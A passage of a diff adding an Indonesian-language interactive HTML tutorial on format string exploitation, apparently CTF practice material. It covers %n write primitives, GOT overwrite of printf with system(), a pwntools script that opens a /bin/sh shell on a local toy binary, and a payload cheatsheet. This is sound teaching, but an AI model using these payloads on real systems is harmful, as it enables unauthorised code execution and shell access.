+      <tr><th>Specifier</th><th>Ukuran write</th><th>Nilai max</th><th>Kapan dipakai</th></tr>
+      <tr><td>%n</td><td>4 byte (int)</td><td>0xFFFFFFFF</td><td>Nilai kecil &lt; 0x1000</td></tr>
+      <tr><td>%hn</td><td>2 byte (short)</td><td>0xFFFF</td><td>Tulis 2 byte sekaligus</td></tr>
+      <tr><td>%hhn</td><td>1 byte (char)</td><td>0xFF</td><td>Paling presisi, paling umum</td></tr>
+    </table>
+    <span class="eq">Untuk tulis 0xdeadbeef ke alamat A:
+- Tulis 0xef ke A+0 dengan %hhn (cetak 0xef = 239 char)
+- Tulis 0xbe ke A+1 dengan %hhn (cetak 0xbe = 190 char)
+- Tulis 0xad ke A+2 dengan %hhn (cetak 0xad = 173 char)
+- Tulis 0xde ke A+3 dengan %hhn (cetak 0xde = 222 char)</span>
+    <div class="note">Ini disebut "byte-by-byte write" atau "split write". Kompleks tapi sangat powerful — bisa tulis nilai apapun ke alamat apapun!</div>
+  </div>
+</div>
+
+<!-- W1 STEP 6 -->
+<div class="step-panel" id="w1-step-6">
+  <div class="card">
+    <div class="step-title">Langkah 7 — Ringkasan Format String Write</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Payload untuk is_admin = 4</div>
+      <div class="big-ans">\x18\xa0\x04\x08 + "%4$n"</div>
+      <div style="font-size:12px;color:#555;margin-top:4px">4 byte alamat + langsung %4$n = 4 char tercetak = is_admin jadi 4</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #BA7517">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Cara kerja Format String Write</p>
+      <p style="font-size:12px">1. Taruh alamat target di awal format string (sebagai raw bytes)</p>
+      <p style="font-size:12px">2. Cari offset: buf ada di parameter ke berapa (%1$p, %2$p, ...)</p>
+      <p style="font-size:12px">3. Hitung: perlu cetak berapa char sebelum %n agar nilainya = target</p>
+      <p style="font-size:12px">4. Pakai %Xc untuk cetak X char sekaligus</p>
+      <p style="font-size:12px">5. %K$n tulis jumlah char ke addr di parameter ke-K</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Nilai yang ditulis = total karakter yang tercetak sebelum %n</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end write -->
+
+<!-- ============================================================ -->
+<!-- GOT OVERWRITE -->
+<!-- ============================================================ -->
+<div id="sec-got" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#BA7517;margin-bottom:6px">Soal 3 — GOT Overwrite (Teknik Paling Powerful)</div>
+  <h2 style="color:#412402">Overwrite GOT untuk redirect fungsi ke target!</h2>
+  <p style="color:#633806;margin-top:6px;margin-bottom:.75rem">GOT (Global Offset Table) adalah tabel pointer yang dipakai untuk memanggil fungsi libc. Kalau kita bisa overwrite GOT[puts] dengan alamat system(), maka setiap panggilan puts() akan jadi system()!</p>
+  <div class="code-block">
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">128</span>];
+    fgets(buf, <span class="cn">128</span>, stdin);
+    printf(buf);         <span class="cm">// ← format string bug</span>
+    puts(<span class="cs">"Done!"</span>);        <span class="cm">// ← ini yang akan kita redirect!</span>
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #FAC775;margin-top:.5rem">
+    <div>GOT[puts] = <span style="color:#BA7517">0x0804a010</span> (dari readelf/pwntools)</div>
+    <div>system() = <span style="color:#27500A">0xb7e52070</span> (ASLR off)</div>
+    <div>"/bin/sh" sudah ada di libc: <span style="color:#27500A">0xb7f6d4af</span></div>
+    <div>buf ada di format string param ke-: <span style="color:#791F1F">4</span></div>
+    <div>Proteksi: Partial RELRO (GOT writable!) | NO ASLR | NO Canary</div>
+  </div>
+  <p style="color:#633806;font-size:12px;margin-top:.5rem">Susun payload untuk overwrite GOT[puts] dengan alamat system() sehingga puts("Done!") → system("Done!") ... tapi kita butuh "/bin/sh"!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="g1-prev" onclick="prevStep('g1')" disabled>Prev</button>
+  <div class="step-dots" id="g1-dots"></div>
+  <span class="step-label" id="g1-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="g1-next" onclick="nextStep('g1')">Next</button>
+</div>
+
+<!-- G1 STEP 0 -->
+<div class="step-panel active" id="g1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Apa itu GOT dan PLT?</div>
+    <h3>GOT = tabel alamat fungsi external yang bisa dimodifikasi</h3>
+    <p style="margin-bottom:.75rem">Saat program memanggil <code>puts("Done!")</code>, yang terjadi sebenarnya:</p>
+    <div class="code-block">
+<span class="cm">; Assembly: panggil puts</span>
+call puts@PLT           <span class="cm">; loncat ke PLT entry</span>
+
+<span class="cm">; Di PLT entry:</span>
+jmp  [GOT[puts]]        <span class="cm">; baca alamat dari GOT, loncat ke sana</span>
+
+<span class="cm">; GOT[puts] awalnya berisi alamat puts() di libc:</span>
+GOT[puts] = 0xb7e52960  <span class="cm">; → loncat ke puts() di libc</span>
+
+<span class="cm">; SETELAH kita overwrite:</span>
+GOT[puts] = 0xb7e52070  <span class="cm">; → loncat ke system()!</span>
+<span class="cm">; puts("Done!") sekarang jadi system("Done!") ← string "Done!" jadi arg!</span>
+    </div>
+    <div class="danger">GOT overwrite mengubah SEMUA panggilan ke puts() menjadi panggilan ke system(). Ini permanen sampai program restart!</div>
+  </div>
+</div>
+
+<!-- G1 STEP 1 -->
+<div class="step-panel" id="g1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Masalah argumen dan solusinya</div>
+    <h3>puts("Done!") → system("Done!") — bukan /bin/sh!</h3>
+    <p style="margin-bottom:.75rem">Kalau kita hanya overwrite GOT[puts], maka <code>puts("Done!")</code> akan jadi <code>system("Done!")</code>. "Done!" bukan command yang valid.</p>
+    <p style="font-size:12px;margin-bottom:.5rem">Beberapa solusi:</p>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px">
+      <div style="padding:.5rem .85rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px">
+        <div style="font-weight:500;color:#27500A;margin-bottom:3px">Solusi 1: Overwrite GOT[printf] bukan puts</div>
+        <div style="color:#3B6D11">printf(buf) → kalau buf = "/bin/sh", maka setelah overwrite: system("/bin/sh")!</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px">
+        <div style="font-weight:500;color:#27500A;margin-bottom:3px">Solusi 2: Dua tahap — overwrite dua fungsi</div>
+        <div style="color:#3B6D11">Overwrite GOT[puts] = system, dan panggil puts("/bin/sh") eksplisit lewat bug lain</div>
+      </div>
+      <div style="padding:.5rem .85rem;background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px">
+        <div style="font-weight:500;color:#633806;margin-bottom:3px">Solusi 3 (paling umum): Overwrite GOT[exit] = win function</div>
+        <div style="color:#854F0B">exit() dipanggil banyak tempat → satu overwrite bisa trigger dari mana saja</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- G1 STEP 2 -->
+<div class="step-panel" id="g1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Strategi: overwrite GOT[printf] dengan system</div>
+    <h3>Karena printf(buf) → kalau buf="/bin/sh" → system("/bin/sh")</h3>
+    <p style="margin-bottom:.75rem">Rencana dua tahap:</p>
+    <div class="step-box"><div style="font-weight:500;margin-bottom:3px">Tahap 1: Format string pertama</div><div style="color:#555">Overwrite GOT[printf] = system(). Setelah ini, setiap printf() jadi system()!</div></div>
+    <div class="step-box"><div style="font-weight:500;margin-bottom:3px">Tahap 2: Input kedua = "/bin/sh"</div><div style="color:#555">Program kembali ke loop dan baca input lagi. Kita kirim "/bin/sh". printf("/bin/sh") → system("/bin/sh") → SHELL!</div></div>
+
+    <p style="font-size:12px;margin:.75rem 0 .4rem">Nilai yang perlu ditulis: system() = 0xb7e52070. Terlalu besar untuk satu %n. Kita pakai dua %hn (2 byte masing-masing):</p>
+    <span class="eq">0xb7e52070 dipecah:
+- 2 byte bawah: 0x2070 = 8304 desimal → tulis ke GOT[printf]+0
+- 2 byte atas:  0xb7e5 = 47077 desimal → tulis ke GOT[printf]+2</span>
+  </div>
+</div>
+
+<!-- G1 STEP 3 -->
+<div class="step-panel" id="g1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Susun payload GOT overwrite</div>
+    <h3>Payload dengan dua %hn untuk tulis 4 byte</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+p = process(<span class="cs">'./vuln'</span>)
+elf = ELF(<span class="cs">'./vuln'</span>)
+
+<span class="cm"># Alamat dari ELF</span>
+got_printf  = elf.got[<span class="cs">'printf'</span>]    <span class="cm"># alamat GOT[printf]</span>
+system_addr = <span class="cn">0xb7e52070</span>
+
+<span class="cm"># Pecah system() jadi dua 2-byte chunk</span>
+low  = system_addr &amp; <span class="cn">0xffff</span>          <span class="cm"># 0x2070 = 8304</span>
+high = (system_addr &gt;&gt; <span class="cn">16</span>) &amp; <span class="cn">0xffff</span>  <span class="cm"># 0xb7e5 = 47077</span>
+
+<span class="cm"># Dua alamat yang akan ditulis:</span>
+addr_low  = p32(got_printf)       <span class="cm"># GOT[printf]+0 (tulis 2 byte bawah)</span>
+addr_high = p32(got_printf + <span class="cn">2</span>)   <span class="cm"># GOT[printf]+2 (tulis 2 byte atas)</span>
+
+<span class="cm"># Payload:</span>
+<span class="cm"># [addr_low][addr_high] = 8 byte header</span>
+<span class="cm"># Lalu: cetak (low - 8) char, %4$hn</span>
+<span class="cm">#        cetak (high - low) char, %5$hn</span>
+
+fmt_low  = low  - <span class="cn">8</span>          <span class="cm"># sudah 8 char dari header</span>
+fmt_high = high - low          <span class="cm"># tambahan untuk total = high</span>
+
+payload  = addr_low + addr_high
+payload += (<span class="cs">f"%{fmt_low}c%4$hn"</span>).encode()
+payload += (<span class="cs">f"%{fmt_high}c%5$hn"</span>).encode()
+
+p.sendline(payload)
+p.sendline(<span class="cs">b'/bin/sh'</span>)   <span class="cm"># → printf("/bin/sh") → system("/bin/sh")!</span>
+p.interactive()
+    </div>
+  </div>
+</div>
+
+<!-- G1 STEP 4 -->
+<div class="step-panel" id="g1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Trace eksekusi GOT overwrite</div>
+    <h3>Apa yang terjadi step by step</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;font-size:12px;margin:.5rem 0">
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">1. Kirim payload format string</div><div style="color:#555">printf(payload) → %hn menulis ke GOT[printf]+0 dan GOT[printf]+2</div></div>
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">2. GOT[printf] sekarang = system()</div><div style="color:#555">GOT termodifikasi: 0x2070 di byte 0-1, 0xb7e5 di byte 2-3 → 0xb7e52070</div></div>
+      <div class="step-box"><div style="font-weight:500;margin-bottom:2px">3. Program baca input lagi (loop)</div><div style="color:#555">Kita kirim "/bin/sh\n"</div></div>
+      <div class="step-box" style="background:#FAEEDA;border-left-color:#BA7517"><div style="font-weight:500;color:#412402;margin-bottom:2px">4. printf("/bin/sh") = system("/bin/sh")</div><div style="color:#633806">GOT sudah di-overwrite → setiap printf() sekarang adalah system()!</div></div>
+      <div class="step-box" style="background:#EAF3DE;border-left-color:#27500A"><div style="font-weight:500;color:#27500A;margin-bottom:2px">5. Shell terbuka!</div><div style="color:#3B6D11">system("/bin/sh") dieksekusi → $ whoami → root</div></div>
+    </div>
+    <div style="text-align:center;padding:1.25rem;background:#1a1a2e;border-radius:12px;margin:.75rem 0">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Hasil GOT overwrite</div>
+      <div class="big-ans" style="color:#a8ff78">GOT[printf] → system() → shell!</div>
+    </div>
+  </div>
+</div>
+
+<!-- G1 STEP 5 -->
+<div class="step-panel" id="g1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Ringkasan Format String Attack lengkap</div>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Primitif</th><th>Specifier</th><th>Dipakai untuk</th></tr>
+      <tr><td>Stack dump</td><td>%p.%p.%p...</td><td>Eksplorasi isi stack</td></tr>
+      <tr><td>Direct read</td><td>%K$p</td><td>Baca nilai di stack param ke-K</td></tr>
+      <tr><td>Memory read</td><td>%K$s</td><td>Baca string dari alamat di param ke-K</td></tr>
+      <tr><td>Count char</td><td>%Nc</td><td>Cetak N karakter (kontrol %n)</td></tr>
+      <tr><td>Write 4 byte</td><td>%K$n</td><td>Tulis total char ke addr di param ke-K</td></tr>
+      <tr><td>Write 2 byte</td><td>%K$hn</td><td>Tulis 2 byte (short) — lebih presisi</td></tr>
+      <tr><td>Write 1 byte</td><td>%K$hhn</td><td>Tulis 1 byte — paling presisi</td></tr>
+    </table>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #BA7517">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Urutan exploit format string di soal</p>
+      <p style="font-size:12px">1. Temukan bug: printf(buf) tanpa format spec</p>
+      <p style="font-size:12px">2. Cari offset buf di stack: kirim %1$p, %2$p, ... sampai nilai = alamat buf</p>
+      <p style="font-size:12px">3. Untuk READ: %K$p / %K$s untuk baca nilai/string</p>
+      <p style="font-size:12px">4. Untuk WRITE: [addr target][%X$c][%K$hn] → GOT overwrite</p>
+      <p style="font-size:12px">5. Hitung nilai padding: total_chars = nilai_target, padding = nilai - header_size</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Full RELRO → GOT tidak bisa ditulis → perlu teknik lain (overwrite return addr, dll)</p>
+    </div>
+  </div>
+</div>
+</div><!-- end got -->
+
+<!-- ============================================================ -->
+<!-- RINGKASAN -->
+<!-- ============================================================ -->
+<div id="sec-ringkasan" class="sec">
+  <div class="card">
+    <div class="step-title">Cheatsheet — Cara kerja tiap format specifier</div>
+    <h3>Satu tabel untuk semua yang perlu diingat</h3>
+    <div class="code-block">
+<span class="cm">═══════════════════════════════════════════</span>
+<span class="cm">         FORMAT STRING CHEATSHEET</span>
+<span class="cm">═══════════════════════════════════════════</span>
+
+<span class="am">READ primitif:</span>
+<span class="yl">%p</span>        → print pointer (4/8 byte hex) dari stack
+<span class="yl">%x</span>        → print unsigned hex 32-bit
+<span class="yl">%K$p</span>      → baca param ke-K langsung (direct access)
+<span class="yl">%K$s</span>      → baca STRING dari addr di param ke-K
+
+<span class="am">WRITE primitif:</span>
+<span class="yl">%n</span>        → tulis 4 byte: jumlah char tercetak
+<span class="yl">%hn</span>       → tulis 2 byte (short)
+<span class="yl">%hhn</span>      → tulis 1 byte (char)
+<span class="yl">%K$n</span>      → tulis ke addr di param ke-K
+<span class="yl">%Nc</span>       → cetak N char (kontrol nilai untuk %n)
+
+<span class="am">Payload write ke addr A, nilai V:</span>
+<span class="yl">payload = p32(A) + f"%{V-4}c%4$n"</span>
+<span class="cm">(asumsi buf ada di param ke-4, addr = 4 byte)</span>
+
+<span class="am">Payload write nilai besar (split 2 byte):</span>
+low  = V & 0xffff
+high = (V >> 16) & 0xffff
+<span class="yl">payload = p32(A) + p32(A+2)</span>
+<span class="yl">payload += f"%{low-8}c%4$hn"</span>
+<span class="yl">payload += f"%{high-low}c%5$hn"</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Cara menemukan offset buf di stack</div>
+    <h3>Metode AAAA trick — cari posisi buf</h3>
+    <div class="code-block">
+<span class="cm"># Kirim "AAAA" + banyak %p untuk cari buf di stack</span>
+<span class="cm"># AAAA dalam hex = 0x41414141</span>
+
+Input: AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p
+
+Output: AAAA.0x1.0xf7f3.0x804a000.0x41414141.0xbffff5c0.0x0
+<span class="cm">#                                  ↑ ini dia! = 0x41414141 = "AAAA"</span>
+<span class="cm"># buf ada di parameter ke-4!</span>
+
+<span class="cm"># Atau lebih efisien dengan pwntools:</span>
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+p = process(<span class="cs">'./vuln'</span>)
+p.sendline(<span class="cs">b'AAAA.' + <span class="cs">b'%p.'</span> * <span class="cn">20</span>)
+output = p.recvline()
+<span class="cm"># Cari 0x41414141 di output → itu offset-nya</span>
+offset = output.split(<span class="cs">b'.'</span>).index(<span class="cs">b'0x41414141'</span>) + <span class="cn">1</span>
+print(<span class="cs">f"buf offset: {offset}"</span>)
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Perbandingan Format String vs Overflow</div>
+    <table class="tbl" style="margin-bottom:.5rem">
+      <tr><th>Aspek</th><th>Buffer Overflow</th><th>Format String</th></tr>
+      <tr><td>Butuh overflow?</td><td style="color:#791F1F">Ya</td><td style="color:#27500A">Tidak!</td></tr>
+      <tr><td>Read primitive?</td><td style="color:#791F1F">Tidak langsung</td><td style="color:#27500A">Ya (%p, %s)</td></tr>
+      <tr><td>Write primitive?</td><td style="color:#791F1F">Hanya ret addr</td><td style="color:#27500A">Ya (%n) — ALAMAT MANA SAJA</td></tr>
+      <tr><td>Bypass canary?</td><td style="color:#791F1F">Perlu leak dulu</td><td style="color:#27500A">Leak canary langsung dengan %p!</td></tr>
+      <tr><td>Deteksi?</td><td style="color:#EF9F27">Mudah dengan ASAN</td><td style="color:#EF9F27">Compiler warning tapi sering diabaikan</td></tr>
+    </table>
+    <div class="danger">Format string seringkali lebih powerful dari overflow karena memberikan BOTH read AND write dalam satu bug!</div>
+  </div>
+</div>
+
+<script>
+const state={
+  r1:{cur:0,total:6},
+  w1:{cur:0,total:7},
+  g1:{cur:0,total:6}
+};
+function renderDots(id){
+  const s=state[id];
+  const d=document.getElementById(id+'-dots');
+  d.innerHTML='';
+  for(let i=0;i<s.total;i++){
+    const b=document.createElement('button');
+    b.className='dot';
+    b.style.cssText=i<s.cur?'background:#FAC775':i===s.cur?'background:#BA7517;width:24px;border-radius:5px':'background:#ccc';
+    b.onclick=(()=>{const j=i;return()=>goStep(id,j)})();
+    d.appendChild(b);
+  }
+}
+function goStep(id,n){
+  const s=state[id];
+  document.getElementById(id+'-step-'+s.cur).classList.remove('active');
+  s.cur=n;
+  document.getElementById(id+'-step-'+n).classList.add('active');
+  document.getElementById(id+'-counter').textContent=(n+1)+' / '+s.total;
+  document.getElementById(id+'-prev').disabled=n===0;
+  document.getElementById(id+'-next').disabled=n===s.total-1;
+  renderDots(id);
+}
+function nextStep(id){const s=state[id];if(s.cur<s.total-1)goStep(id,s.cur+1);}
+function prevStep(id){const s=state[id];if(s.cur>0)goStep(id,s.cur-1);}
+function showSec(name){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('sec-'+name).classList.add('active');
+  event.target.classList.add('active');
+}
+renderDots('r1');renderDots('w1');renderDots('g1');
+</script>
+</body>
+</html>
